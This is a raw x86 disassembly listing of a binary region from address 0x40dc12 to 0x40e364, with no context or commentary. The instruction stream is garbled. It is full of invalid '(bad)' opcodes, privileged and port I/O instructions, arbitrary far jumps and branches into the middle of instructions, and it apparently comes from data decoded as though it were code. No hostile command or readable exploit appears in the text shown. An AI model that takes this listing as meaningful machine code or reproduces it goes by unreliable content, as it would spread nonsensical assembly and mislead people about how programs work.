  40dc12:	imul   DWORD PTR [ebx-0x20]
  40dc15:	stc    
  40dc16:	and    al,0x4b
  40dc18:	cmp    dh,BYTE PTR [eax]
  40dc1a:	mov    cl,0xa9
  40dc1c:	sub    DWORD PTR [ebx-0x72],eax
  40dc1f:	mov    ecx,0xabc7bb95
  40dc24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc25:	or     edx,0x514dd89e
  40dc2b:	fsub   DWORD PTR [esi+eax*2]
  40dc2e:	stos   BYTE PTR es:[edi],al
  40dc2f:	xor    DWORD PTR ss:[esi-0x3a],edx
  40dc33:	cli    
  40dc34:	mov    cl,0x8c
  40dc36:	in     eax,0x9a
  40dc38:	imul   ebx,edx,0x328fa118
  40dc3e:	pop    ebx
  40dc3f:	fisttp WORD PTR ds:0x91a5dd74
  40dc45:	rcr    DWORD PTR [eax+0x6ecb07e2],1
  40dc4b:	mov    al,0xae
  40dc4d:	and    BYTE PTR [edx],bh
  40dc4f:	(bad)  
  40dc51:	arpl   WORD PTR [ecx],si
  40dc53:	and    esi,DWORD PTR [edx]
  40dc55:	push   eax
  40dc56:	das    
  40dc57:	fisttp QWORD PTR [ecx]
  40dc59:	cmp    al,0x98
  40dc5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc5c:	ficom  WORD PTR [eax-0x49]
  40dc5f:	sahf   
  40dc60:	and    al,0xdc
  40dc62:	je     0x40dcdd
  40dc64:	xor    al,BYTE PTR [edx]
  40dc66:	es dec ebx
  40dc68:	clc    
  40dc69:	dec    esp
  40dc6a:	xor    esi,DWORD PTR [ecx-0x4b7d0864]
  40dc70:	fbstp  TBYTE PTR [ebp+0x2f28a6e7]
  40dc76:	ds dec esi
  40dc78:	ss sub al,0xe9
  40dc7b:	int    0x50
  40dc7d:	push   0xffffff9f
  40dc7f:	test   eax,0xf3ef0eab
  40dc84:	fnsave [edi-0x2552257b]
  40dc8a:	jae    0x40dca0
  40dc8c:	mov    eax,ds:0x958d3a8e
  40dc91:	scas   al,BYTE PTR es:[edi]
  40dc92:	and    al,0x5f
  40dc94:	in     al,0x67
  40dc96:	and    BYTE PTR [ebp-0x17],dl
  40dc99:	sbb    edx,DWORD PTR [ecx-0x46]
  40dc9c:	jge    0x40dcbd
  40dc9e:	sahf   
  40dc9f:	addr16 aas 
  40dca1:	jns    0x40dce7
  40dca3:	cli    
  40dca4:	cwde   
  40dca5:	cdq    
  40dca6:	ret    0xdbed
  40dca9:	xor    al,0x46
  40dcab:	repnz add ecx,DWORD PTR [ebp+0x4048b3f7]
  40dcb2:	rcr    DWORD PTR [ebx],1
  40dcb4:	or     al,0x3e
  40dcb6:	fwait
  40dcb7:	mov    ah,0x14
  40dcb9:	aad    0x9d
  40dcbb:	pop    edi
  40dcbc:	ins    DWORD PTR es:[edi],dx
  40dcbd:	mov    bl,0xa8
  40dcbf:	std    
  40dcc0:	loopne 0x40dc47
  40dcc2:	iret   
  40dcc3:	sbb    DWORD PTR [ecx+0x3bf03673],edi
  40dcc9:	xchg   ecx,eax
  40dcca:	pop    ecx
  40dccb:	dec    edx
  40dccc:	cmp    eax,0x3500d6b1
  40dcd1:	cdq    
  40dcd2:	xor    esp,DWORD PTR [eax-0x7]
  40dcd5:	pop    esp
  40dcd6:	pop    es
  40dcd7:	push   es
  40dcd8:	ret    0x8e0c
  40dcdb:	xchg   ebp,eax
  40dcdc:	fs pop ss
  40dcde:	adc    cl,0x18
  40dce1:	outs   dx,BYTE PTR ds:[esi]
  40dce2:	mov    ah,0x12
  40dce4:	pop    ss
  40dce5:	aam    0x57
  40dce7:	shl    ebx,0x5e
  40dcea:	and    esp,DWORD PTR [ebp-0xa32f569]
  40dcf0:	sbb    eax,0xe6328d87
  40dcf5:	push   esi
  40dcf6:	mov    edx,0xd7f14cd5
  40dcfb:	call   0xff715cc
  40dd00:	outs   dx,BYTE PTR ds:[esi]
  40dd01:	jo     0x40dcdc
  40dd03:	mov    dl,0x91
  40dd05:	(bad)  
  40dd06:	dec    ecx
  40dd07:	ja     0x40dcbe
  40dd09:	nop
  40dd0a:	retf   
  40dd0b:	push   eax
  40dd0d:	stos   BYTE PTR es:[edi],al
  40dd0e:	dec    esi
  40dd0f:	push   ebx
  40dd10:	loop   0x40dd63
  40dd12:	pop    ecx
  40dd13:	fdiv   DWORD PTR [esi-0x41249d50]
  40dd19:	neg    ebx
  40dd1b:	push   ss
  40dd1c:	dec    edi
  40dd1d:	aaa    
  40dd1e:	in     eax,0xd0
  40dd20:	adc    al,0xef
  40dd22:	call   0x7ffc:0xc7e0566f
  40dd29:	xchg   edx,eax
  40dd2a:	xor    al,0x62
  40dd2c:	mov    dl,0x63
  40dd2e:	fisttp DWORD PTR [edx]
  40dd30:	lahf   
  40dd31:	mov    al,0xe
  40dd33:	(bad)  
  40dd34:	(bad)  
  40dd35:	pop    edx
  40dd36:	pop    esi
  40dd37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd38:	and    BYTE PTR [esi-0x27],dl
  40dd3b:	test   BYTE PTR [edx],al
  40dd3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd3e:	mov    al,bh
  40dd40:	scas   eax,DWORD PTR es:[edi]
  40dd41:	cmp    esi,DWORD PTR [eax+0x20561757]
  40dd47:	iret   
  40dd48:	outs   dx,DWORD PTR ds:[esi]
  40dd49:	xor    BYTE PTR [ebp-0x73],al
  40dd4c:	mov    eax,0x68985f27
  40dd51:	bound  ebp,QWORD PTR [edx+0xb]
  40dd54:	mov    DWORD PTR [edi+ebp*1-0x37f4bee3],edi
  40dd5b:	dec    ecx
  40dd5c:	sbb    BYTE PTR [ebx-0x44f86f0f],dh
  40dd62:	ret    
  40dd63:	xor    al,0x3
  40dd65:	adc    eax,0x4b79c2b3
  40dd6a:	mov    ds:0x8cd832f0,al
  40dd6f:	pushf  
  40dd70:	test   al,0xca
  40dd72:	xchg   edi,eax
  40dd73:	sub    ecx,edi
  40dd75:	add    BYTE PTR [ecx+0x1f],al
  40dd78:	and    esp,DWORD PTR [esi+ebx*4]
  40dd7b:	lea    esi,[ebx]
  40dd7d:	jl     0x40dd5e
  40dd7f:	pop    esp
  40dd80:	mov    esi,esp
  40dd82:	xor    DWORD PTR [ebp+0x6b86d969],ebp
  40dd88:	jnp    0x40dd2f
  40dd8a:	sub    DWORD PTR [ebp-0x65d5106c],edx
  40dd90:	mov    ch,BYTE PTR [edi-0x5f417c8]
  40dd96:	xchg   esp,eax
  40dd97:	enter  0x6469,0xfb
  40dd9b:	cdq    
  40dd9c:	fimul  DWORD PTR [edx+ebx*4]
  40dd9f:	cs and eax,0xffffffcc
  40dda3:	fcom   DWORD PTR [ebp-0x36ba7691]
  40dda9:	in     al,dx
  40ddaa:	push   ss
  40ddab:	and    bh,al
  40ddad:	fadd   st(4),st
  40ddaf:	pop    ebx
  40ddb0:	mov    al,0x6f
  40ddb2:	mov    gs,WORD PTR [eax+ebx*8]
  40ddb5:	adc    BYTE PTR [ecx+0x5134f78d],al
  40ddbb:	jmp    0x43c63f1c
  40ddc0:	lea    ebx,[eax]
  40ddc2:	dec    eax
  40ddc3:	dec    ecx
  40ddc4:	xchg   ebp,eax
  40ddc5:	stos   DWORD PTR es:[edi],eax
  40ddc6:	ss pop ebp
  40ddc8:	xchg   ebp,eax
  40ddc9:	cwde   
  40ddca:	adc    DWORD PTR [ebp+0x3ee22c54],edi
  40ddd0:	pop    es
  40ddd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddd2:	or     ch,BYTE PTR [ebp+eiz*1+0x78]
  40ddd6:	scas   al,BYTE PTR es:[edi]
  40ddd7:	adc    esp,DWORD PTR [eax+0x187b813d]
  40dddd:	sub    al,0x7
  40dddf:	sbb    eax,0x407944de
  40dde4:	push   cs
  40dde5:	pop    es
  40dde6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dde7:	addr16 cli 
  40dde9:	jbe    0x40dda6
  40ddeb:	mov    al,ds:0x1672970a
  40ddf0:	outs   dx,BYTE PTR ds:[esi]
  40ddf1:	inc    ebp
  40ddf2:	fcmovb st,st(5)
  40ddf4:	aad    0xa5
  40ddf6:	rol    dl,cl
  40ddf8:	call   0xca33b70d
  40ddfd:	fs loopne 0x40de3b
  40de00:	pop    ecx
  40de01:	dec    ecx
  40de02:	aam    0xdb
  40de04:	pusha  
  40de05:	in     eax,dx
  40de06:	add    cl,ch
  40de08:	int    0xe9
  40de0a:	jp     0x40dd92
  40de0c:	clc    
  40de0d:	std    
  40de0e:	scas   al,BYTE PTR es:[edi]
  40de0f:	hlt    
  40de10:	jne    0x40de58
  40de12:	icebp  
  40de13:	popa   
  40de14:	shl    BYTE PTR [ecx+0x4c4a85a8],1
  40de1a:	add    edi,ebp
  40de1c:	fwait
  40de1d:	mov    al,ds:0xd13834bf
  40de22:	pusha  
  40de23:	sub    BYTE PTR [eax+0x65547f37],ch
  40de29:	jmp    0x7264:0x591bc69b
  40de30:	inc    edi
  40de31:	or     al,0xdc
  40de33:	push   ebp
  40de34:	lahf   
  40de35:	pop    ebx
  40de36:	and    dl,al
  40de38:	(bad)  
  40de39:	xor    cl,bl
  40de3b:	xchg   edi,eax
  40de3c:	pop    ebx
  40de3d:	jno    0x40ddcf
  40de3f:	ss pop esi
  40de41:	and    eax,0x87849e15
  40de46:	ss adc eax,0x48984e0c
  40de4c:	pop    edi
  40de4d:	add    bh,0x26
  40de50:	int    0xc9
  40de52:	cmp    BYTE PTR [edi+0x19d8c4fc],cl
  40de58:	cli    
  40de59:	jns    0x40de29
  40de5b:	push   ds
  40de5c:	jnp    0x40de9c
  40de5e:	nop
  40de5f:	dec    esi
  40de60:	fist   DWORD PTR [ebx]
  40de62:	cmp    al,0x66
  40de64:	rol    BYTE PTR [esi-0x68],0xe4
  40de68:	push   ecx
  40de69:	sbb    dl,dh
  40de6b:	icebp  
  40de6c:	(bad)  
  40de6d:	test   al,0x85
  40de6f:	stos   DWORD PTR es:[edi],eax
  40de70:	mov    dh,0xa0
  40de72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de73:	lock cmp BYTE PTR [ecx-0x5850f4cc],dh
  40de7a:	or     ecx,DWORD PTR [ebx+0x7d0e7f5c]
  40de80:	data16 jp 0x40ded8
  40de83:	mov    eax,ds:0x2b280543
  40de88:	mov    bl,0xec
  40de8a:	jmp    0xe9463098
  40de8f:	cs push ss
  40de91:	push   edx
  40de92:	lahf   
  40de93:	or     al,0x18
  40de95:	fs mov bh,0x59
  40de98:	ja     0x40de66
  40de9a:	sub    edx,ecx
  40de9c:	xchg   ecx,eax
  40de9d:	sbb    al,0xef
  40de9f:	stc    
  40dea0:	test   eax,0x21c3383b
  40dea5:	ret    
  40dea6:	out    0x53,al
  40dea8:	scas   eax,DWORD PTR es:[edi]
  40dea9:	(bad)  
  40deaa:	scas   eax,DWORD PTR es:[edi]
  40deab:	ss dec ecx
  40dead:	je     0x40def9
  40deaf:	(bad)  
  40deb0:	jl     0x40de98
  40deb2:	xchg   edx,eax
  40deb3:	xchg   edi,eax
  40deb4:	fstp   DWORD PTR [edi-0x1]
  40deb7:	or     DWORD PTR [esi],edi
  40deb9:	imul   edi,DWORD PTR [edi],0xffffff9c
  40debc:	push   ecx
  40debd:	xchg   esp,eax
  40debe:	test   al,0x52
  40dec0:	clc    
  40dec1:	(bad)  
  40dec2:	and    al,0x64
  40dec4:	mov    bl,0x88
  40dec6:	aad    0xb3
  40dec8:	mov    ah,0xbf
  40deca:	xchg   ecx,eax
  40decb:	imul   BYTE PTR [ebp-0x20a7f92a]
  40ded1:	inc    edi
  40ded2:	leave  
  40ded3:	push   esp
  40ded4:	inc    edx
  40ded5:	xor    BYTE PTR [esi-0x60521419],dh
  40dedb:	xchg   edi,eax
  40dedc:	pop    esp
  40dedd:	push   ss
  40dede:	xchg   edx,eax
  40dedf:	mov    ?,WORD PTR [esi-0x31]
  40dee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dee3:	call   0xbc8daa47
  40dee8:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40deea:	mov    esi,0x450198d2
  40deef:	je     0x40df69
  40def1:	dec    ebp
  40def2:	mov    bl,cl
  40def4:	aam    0x54
  40def6:	and    WORD PTR [esi],cx
  40def9:	dec    edx
  40defa:	mov    bl,0x2f
  40defc:	adc    ebx,ebp
  40defe:	mov    edx,0x281ecb63
  40df03:	in     eax,0x97
  40df05:	enter  0xe214,0xce
  40df09:	jp     0x40dee7
  40df0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df0c:	and    eax,0x6fe32924
  40df11:	or     ch,0xd6
  40df14:	lods   eax,DWORD PTR ds:[esi]
  40df15:	xchg   esi,eax
  40df16:	mov    ebx,0x365a6520
  40df1b:	mov    eax,ds:0xb01973a7
  40df20:	xchg   DWORD PTR [ebp-0x3ada67a4],esi
  40df26:	jge    0x40df84
  40df28:	and    BYTE PTR [ebp-0x2e279ef1],ch
  40df2e:	in     al,dx
  40df2f:	dec    edx
  40df30:	dec    ebx
  40df31:	cmp    DWORD PTR ds:0x8c532926,edx
  40df37:	pop    edx
  40df38:	mov    esp,0x753baa46
  40df3d:	pop    ss
  40df3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df3f:	inc    esp
  40df40:	int    0xa4
  40df42:	inc    ebp
  40df43:	and    DWORD PTR [edi-0x6373eae3],edx
  40df49:	outs   dx,BYTE PTR ds:[esi]
  40df4a:	cmp    al,0x99
  40df4c:	xchg   esp,eax
  40df4d:	sbb    ebp,ebp
  40df4f:	or     BYTE PTR [eax],bh
  40df51:	push   ebx
  40df52:	rcr    DWORD PTR [ebx],0x42
  40df55:	imul   ebx,DWORD PTR [eax],0x76
  40df58:	(bad)  
  40df59:	js     0x40df81
  40df5b:	xor    al,0x20
  40df5d:	stc    
  40df5e:	mov    esp,0x36ac3e72
  40df63:	int    0x3b
  40df65:	in     eax,dx
  40df66:	sub    BYTE PTR [eax-0x4d4a9d4],bh
  40df6c:	pop    ss
  40df6d:	add    eax,0x3ded846f
  40df72:	adc    eax,DWORD PTR [ebx+0x6df7bbe3]
  40df78:	sub    dl,bh
  40df7a:	sbb    BYTE PTR [edx+ecx*4-0x9],0xaa
  40df7f:	(bad)  
  40df80:	in     al,0x88
  40df82:	mov    ch,0xae
  40df84:	jo     0x40dfcf
  40df86:	into   
  40df87:	pushf  
  40df88:	inc    ebx
  40df89:	js     0x40dfc4
  40df8b:	fist   DWORD PTR [edx]
  40df8d:	aad    0x7c
  40df8f:	jle    0x40df34
  40df91:	add    ch,BYTE PTR [ecx+ebx*2]
  40df94:	ins    BYTE PTR es:[edi],dx
  40df95:	pop    ebx
  40df96:	pop    esi
  40df97:	pop    ebx
  40df98:	fadd   DWORD PTR [esi]
  40df9a:	push   ecx
  40df9b:	sbb    al,0x2c
  40df9d:	sbb    al,0xdb
  40df9f:	in     al,dx
  40dfa0:	in     eax,0x6d
  40dfa2:	sbb    esi,esi
  40dfa4:	cmp    eax,0xeb92829
  40dfa9:	mov    BYTE PTR [ecx+ebx*1+0x78d07fc1],dh
  40dfb0:	inc    edi
  40dfb1:	scas   eax,DWORD PTR es:[edi]
  40dfb2:	jp     0x40e01b
  40dfb4:	retf   0x8a
  40dfb7:	mov    al,0xf2
  40dfb9:	out    dx,al
  40dfba:	xchg   esi,eax
  40dfbb:	jl     0x40e007
  40dfbd:	mov    ebp,0x7d83c40c
  40dfc2:	jns    0x40e031
  40dfc4:	push   ebx
  40dfc5:	cmp    esi,DWORD PTR [ebx+eax*1+0x1d465d91]
  40dfcc:	and    al,bh
  40dfce:	aas    
  40dfcf:	lods   al,BYTE PTR ds:[esi]
  40dfd0:	adc    al,0x65
  40dfd2:	xor    BYTE PTR [edi],bl
  40dfd4:	adc    BYTE PTR [esi+ebp*1+0x6d],dh
  40dfd8:	push   0x2e
  40dfda:	popf   
  40dfdb:	inc    edi
  40dfdc:	xor    ah,BYTE PTR [edx]
  40dfde:	sbb    eax,0x76bc1494
  40dfe3:	sub    dh,BYTE PTR [eax]
  40dfe5:	adc    eax,0x3fa63718
  40dfea:	mov    ch,BYTE PTR [edx+0x3cb329de]
  40dff0:	pop    eax
  40dff1:	mov    eax,ds:0x8e344e9c
  40dff6:	jg     0x40df84
  40dff8:	and    DWORD PTR [eax+ecx*8],ecx
  40dffb:	les    eax,FWORD PTR [eax+0x64407045]
  40e001:	mov    ebp,0xfcea6603
  40e006:	int    0xa
  40e008:	retf   0xaae5
  40e00b:	xchg   edx,eax
  40e00c:	mov    eax,0x8c7bba57
  40e011:	sub    al,cl
  40e013:	xchg   edi,eax
  40e014:	adc    al,BYTE PTR [ebp+esi*1-0x4]
  40e018:	rol    DWORD PTR [edi+0x1b],1
  40e01b:	or     dh,BYTE PTR [ebx-0x4a92bca2]
  40e021:	jmp    0x6c50:0xbe452910
  40e028:	adc    BYTE PTR [edx+0x9],ah
  40e02b:	bound  ebp,QWORD PTR [ebp-0x50150302]
  40e031:	or     eax,0xf61f3e9
  40e036:	mov    ebp,0x21449339
  40e03b:	ja     0x40e064
  40e03d:	stos   DWORD PTR es:[edi],eax
  40e03e:	pop    ebp
  40e03f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e040:	fild   DWORD PTR [eax+eax*1-0x52fefeb]
  40e047:	arpl   WORD PTR [eax+ebp*1],ax
  40e04a:	(bad)  
  40e04b:	jge    0x40dfe5
  40e04d:	and    al,0x10
  40e04f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e050:	dec    esp
  40e051:	rep outs dx,BYTE PTR ds:[esi]
  40e053:	lds    edx,FWORD PTR [esi-0x5a]
  40e056:	pop    ebp
  40e057:	lock stc 
  40e059:	int3   
  40e05a:	retf   0x26f1
  40e05d:	mov    dl,0x23
  40e05f:	sub    bl,BYTE PTR [ecx+0x121c50b7]
  40e065:	ins    DWORD PTR es:[edi],dx
  40e066:	mov    bh,0xf5
  40e068:	sbb    ebx,DWORD PTR [esp+eax*2]
  40e06b:	jne    0x40dff7
  40e06d:	iret   
  40e06e:	inc    ebx
  40e06f:	dec    esi
  40e070:	(bad)  
  40e071:	(bad)  
  40e072:	xchg   ebx,eax
  40e073:	in     al,0x98
  40e075:	call   0x8165:0xa520d7ba
  40e07c:	cmp    ebx,ebp
  40e07e:	xchg   DWORD PTR [ecx-0x27510c],edi
  40e084:	and    esi,DWORD PTR ds:0x8b1d18e4
  40e08a:	jno    0x40e0ac
  40e08c:	xchg   ebp,eax
  40e08d:	pop    esi
  40e08e:	jge    0x40e014
  40e090:	xlat   BYTE PTR ds:[ebx]
  40e091:	aam    0xc0
  40e093:	and    ecx,edx
  40e095:	xchg   ebp,eax
  40e096:	ins    DWORD PTR es:[edi],dx
  40e097:	hlt    
  40e098:	in     al,0xbd
  40e09a:	pop    edx
  40e09b:	loope  0x40e0d5
  40e09d:	or     bh,ch
  40e09f:	pop    ecx
  40e0a0:	mov    al,BYTE PTR [edx]
  40e0a2:	and    esi,DWORD PTR [ebp+0x6a83b566]
  40e0a8:	inc    esp
  40e0a9:	idiv   BYTE PTR [edx]
  40e0ab:	add    DWORD PTR [edi+0x73],ebx
  40e0ae:	dec    esp
  40e0af:	xor    ebp,DWORD PTR [edi+ebx*8-0x10127cf0]
  40e0b6:	out    0x42,eax
  40e0b8:	cdq    
  40e0b9:	daa    
  40e0ba:	xor    edx,esp
  40e0bc:	ins    BYTE PTR es:[edi],dx
  40e0bd:	xchg   ecx,eax
  40e0be:	(bad)  
  40e0c0:	sbb    eax,0xb8671b4c
  40e0c5:	lock (bad) 
  40e0c7:	scas   eax,DWORD PTR es:[edi]
  40e0c8:	adc    al,0xdb
  40e0ca:	mov    ebx,cs
  40e0cc:	dec    eax
  40e0cd:	aam    0x1a
  40e0cf:	outs   dx,DWORD PTR ds:[esi]
  40e0d0:	out    0x73,al
  40e0d2:	cs fwait
  40e0d4:	jecxz  0x40e06a
  40e0d6:	sub    al,0x45
  40e0d8:	js     0x40e151
  40e0da:	or     BYTE PTR [ecx+0x6],dh
  40e0dd:	cmp    eax,0x961addd3
  40e0e2:	les    eax,FWORD PTR ds:0x14f451a6
  40e0e8:	mov    dl,0x87
  40e0ea:	mov    edi,0x71c69d11
  40e0ef:	inc    edx
  40e0f0:	or     ecx,esp
  40e0f2:	ins    DWORD PTR es:[edi],dx
  40e0f3:	mov    DWORD PTR [eax],ebp
  40e0f5:	jae    0x40e0f8
  40e0f7:	add    BYTE PTR [ecx+0x46],cl
  40e0fa:	push   cs
  40e0fb:	xchg   ebp,eax
  40e0fc:	jmp    0x9c9b:0xbd338d8a
  40e103:	aad    0x99
  40e105:	mov    edi,0x131fcf4
  40e10a:	lods   eax,DWORD PTR ds:[esi]
  40e10b:	push   edi
  40e10c:	xor    edx,DWORD PTR ds:0x8ade51f9
  40e112:	nop
  40e113:	add    dh,bh
  40e115:	das    
  40e116:	cli    
  40e117:	repnz in eax,dx
  40e119:	test   BYTE PTR [edx],al
  40e11b:	test   eax,0x8f033e86
  40e120:	and    eax,0x6f53763d
  40e125:	pop    esi
  40e126:	cmp    al,0x63
  40e128:	addr16 sti 
  40e12a:	push   0x23
  40e12c:	sub    cl,BYTE PTR [esi-0x69668ec4]
  40e132:	pop    ds
  40e133:	loope  0x40e17f
  40e135:	sbb    ebp,DWORD PTR [ebp+0x4b]
  40e138:	mov    esi,0xbe96d523
  40e13d:	aad    0xf5
  40e13f:	fstp   st(1)
  40e141:	push   ebx
  40e142:	test   BYTE PTR [ecx],0x6
  40e145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e146:	cdq    
  40e147:	das    
  40e148:	pop    edx
  40e149:	mov    eax,0xcecbac0c
  40e14e:	jne    0x40e119
  40e150:	mov    eax,0xc93b0c4b
  40e155:	jle    0x40e115
  40e157:	xchg   edi,eax
  40e158:	fdiv   QWORD PTR [esi+0x271e8700]
  40e15e:	lds    ebx,FWORD PTR [ebx]
  40e160:	sar    dh,1
  40e162:	jmp    0x90779219
  40e167:	cwde   
  40e168:	jmp    0x40e112
  40e16a:	mov    ds:0xcdb9afb5,eax
  40e16f:	jmp    0x40e1c5
  40e171:	aaa    
  40e172:	fmul   DWORD PTR [ebp-0x267f27cd]
  40e178:	jmp    0x9c489d62
  40e17d:	dec    esi
  40e17e:	loopne 0x40e176
  40e180:	mov    bl,0xa4
  40e182:	xor    dl,BYTE PTR [esi+esi*4-0x55]
  40e186:	xor    DWORD PTR [edx+edx*1],esi
  40e189:	fiadd  DWORD PTR [edx-0x6deae770]
  40e18f:	lock mov edi,0x363dff76
  40e195:	stc    
  40e196:	scas   al,BYTE PTR es:[edi]
  40e197:	cmp    BYTE PTR [ebx-0x19],ah
  40e19a:	jbe    0x40e20d
  40e19c:	iret   
  40e19d:	sbb    DWORD PTR [edi-0x7ce95ea8],0xffab99a0
  40e1a7:	(bad)  
  40e1a8:	pand   mm6,QWORD PTR [edx+ebp*8+0x59ce4401]
  40e1b0:	(bad)  
  40e1b1:	cmp    BYTE PTR [esi-0x38],dh
  40e1b4:	xchg   edx,eax
  40e1b5:	and    eax,0xffffffb2
  40e1b8:	or     eax,edi
  40e1ba:	dec    DWORD PTR [ebp-0x4d]
  40e1bd:	sahf   
  40e1be:	push   edx
  40e1bf:	sbb    bh,BYTE PTR [ebp+0x77c9ba36]
  40e1c5:	popf   
  40e1c6:	xor    BYTE PTR [eax],cl
  40e1c8:	add    al,0x5c
  40e1ca:	or     DWORD PTR [edx-0x79],ebx
  40e1cd:	mov    ds:0xe523ae51,eax
  40e1d2:	rcl    DWORD PTR [edi-0x1437a68],1
  40e1d8:	div    ebp
  40e1da:	std    
  40e1db:	xor    DWORD PTR [ebx+edi*1],ebx
  40e1de:	in     al,dx
  40e1df:	je     0x40e1b1
  40e1e1:	sbb    edi,DWORD PTR [edx+ebx*1]
  40e1e4:	push   esi
  40e1e5:	jl     0x40e1c9
  40e1e7:	or     esi,DWORD PTR [ecx+eiz*4+0x7c]
  40e1eb:	adc    ah,bl
  40e1ed:	leave  
  40e1ee:	in     al,dx
  40e1ef:	jp     0x40e1d5
  40e1f1:	lea    edx,[ebp-0x17]
  40e1f4:	fcom   DWORD PTR [esi-0x3eb26ee1]
  40e1fa:	stc    
  40e1fb:	push   ecx
  40e1fc:	mov    esp,0x6260f368
  40e201:	jge    0x40e1d5
  40e203:	mov    bl,0xd2
  40e205:	cdq    
  40e206:	test   al,0x3d
  40e208:	and    BYTE PTR [edx-0x6b],bh
  40e20b:	cs in  al,0xb2
  40e20e:	mov    edi,0x658a4414
  40e213:	sbb    eax,0x38994727
  40e218:	sub    BYTE PTR [ebx+0x7cc4163b],dl
  40e21e:	leave  
  40e21f:	cmovbe esp,DWORD PTR [ebp-0x5a]
  40e223:	lock daa 
  40e225:	pop    edi
  40e226:	ror    ebp,cl
  40e228:	xchg   BYTE PTR [edx],bl
  40e22a:	cmp    BYTE PTR [esi-0x5665c59a],dl
  40e230:	jp     0x40e236
  40e232:	fidivr DWORD PTR [esi+0x190cda3e]
  40e238:	dec    ecx
  40e239:	lock retf 
  40e23b:	ds adc eax,0xa0d2b6d
  40e241:	imul   ecx,DWORD PTR [ecx+0x7a4f162b],0xe3328930
  40e24b:	shl    DWORD PTR [ecx+0x7f4b9b77],cl
  40e251:	adc    eax,0x57fcf552
  40e256:	in     eax,0x84
  40e258:	pop    ebx
  40e259:	dec    edi
  40e25a:	inc    ebp
  40e25b:	les    edx,FWORD PTR [ecx]
  40e25d:	popa   
  40e25e:	jp     0x40e255
  40e260:	inc    edx
  40e261:	jecxz  0x40e244
  40e263:	ror    DWORD PTR ds:0xa7fb77d,0xbd
  40e26a:	dec    esp
  40e26b:	ja     0x40e226
  40e26d:	push   esi
  40e26e:	in     eax,dx
  40e26f:	sbb    BYTE PTR [edi],dl
  40e271:	nop
  40e272:	or     BYTE PTR [edi],ch
  40e274:	hlt    
  40e275:	inc    edx
  40e276:	mov    esi,0x98ad7104
  40e27b:	push   es
  40e27c:	add    BYTE PTR [ebx+0x50],dh
  40e27f:	inc    edi
  40e280:	or     al,BYTE PTR ds:0xa84c0ae4
  40e286:	jb     0x40e2e9
  40e288:	(bad)  
  40e289:	aad    0xb7
  40e28b:	and    ch,BYTE PTR [edi]
  40e28d:	and    eax,0x467a36e0
  40e292:	ja     0x40e27b
  40e294:	inc    edi
  40e295:	(bad)  [edx-0x35]
  40e298:	push   ds
  40e299:	mov    ds:0x7d249ce3,al
  40e29e:	add    al,0xd
  40e2a0:	mov    al,ds:0x7f31a0e8
  40e2a5:	pop    esi
  40e2a6:	jne    0x40e2e9
  40e2a8:	int    0x4e
  40e2aa:	in     al,dx
  40e2ab:	pushf  
  40e2ac:	adc    edi,DWORD PTR [esi]
  40e2ae:	sbb    ah,ah
  40e2b0:	in     eax,dx
  40e2b1:	dec    esp
  40e2b2:	add    esp,DWORD PTR [esi-0x2cbfd440]
  40e2b8:	out    dx,al
  40e2b9:	xchg   esp,ecx
  40e2bb:	mov    ecx,0xa3db49e0
  40e2c0:	cmp    ah,BYTE PTR [edx+0x78]
  40e2c3:	jle    0x40e306
  40e2c5:	push   ds
  40e2c6:	ret    
  40e2c7:	or     al,0x8c
  40e2c9:	jmp    0x558e036f
  40e2ce:	push   ebx
  40e2cf:	cmc    
  40e2d0:	push   ecx
  40e2d1:	ds test al,0xa1
  40e2d4:	push   ss
  40e2d5:	ins    BYTE PTR es:[edi],dx
  40e2d6:	mov    ecx,0x9b5b4c80
  40e2db:	loop   0x40e316
  40e2dd:	mov    BYTE PTR [ebp+0x3c],0xd9
  40e2e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2e2:	iret   
  40e2e3:	in     al,dx
  40e2e4:	mov    esp,0x17294f10
  40e2e9:	test   al,0xba
  40e2eb:	(bad)  
  40e2ec:	call   0xeba8:0x33f70b7e
  40e2f3:	xchg   ebx,eax
  40e2f4:	and    ebx,edi
  40e2f6:	mul    BYTE PTR ds:[ecx]
  40e2f9:	fwait
  40e2fa:	inc    esi
  40e2fb:	inc    eax
  40e2fc:	push   esi
  40e2fd:	ds fwait
  40e2ff:	arpl   WORD PTR [ebx+0x21],ax
  40e302:	xlat   BYTE PTR ds:[ebx]
  40e303:	test   eax,0xd778f24c
  40e308:	jge    0x40e2d9
  40e30a:	or     eax,0xe42220ee
  40e30f:	inc    edi
  40e310:	dec    edi
  40e311:	shl    BYTE PTR [edx-0x50],cl
  40e314:	retf   0x5084
  40e317:	push   esi
  40e318:	popf   
  40e319:	aad    0x60
  40e31b:	mov    ds:0x642fa552,al
  40e320:	adc    eax,0x61190e0f
  40e325:	push   ss
  40e326:	and    DWORD PTR [ebx+0x2bc8df36],edx
  40e32c:	test   eax,0x92547fa5
  40e331:	ss ret 0x8787
  40e335:	jecxz  0x40e33b
  40e337:	ins    BYTE PTR es:[edi],dx
  40e338:	loopne 0x40e37b
  40e33a:	leave  
  40e33b:	push   es
  40e33c:	aam    0xad
  40e33e:	cmp    al,0x4
  40e340:	dec    esi
  40e341:	xchg   edi,eax
  40e342:	test   eax,0x6f3a124f
  40e347:	jmp    0x40e38d
  40e349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e34a:	mov    al,ds:0x1110c35f
  40e34f:	sub    bl,BYTE PTR [eax-0x13]
  40e352:	jmp    0xa3684e05
  40e357:	push   ss
  40e358:	retf   0xfbed
  40e35b:	mov    ebp,DWORD PTR [ebp-0x26e55331]
  40e361:	test   BYTE PTR [ecx],0xc1
  40e364:	scas   eax,DWORD PTR es:[edi]
